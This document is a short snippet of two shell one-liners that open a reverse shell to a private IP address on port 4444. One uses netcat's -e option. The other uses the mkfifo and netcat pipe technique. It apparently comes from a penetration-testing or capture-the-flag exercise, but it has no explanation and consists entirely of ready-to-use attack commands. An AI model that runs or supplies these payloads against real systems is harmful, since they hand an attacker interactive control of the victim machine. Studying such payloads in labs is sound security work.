nc -e /bin/sh 10.8.105.196 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.105.196 4444 >/tmp/f
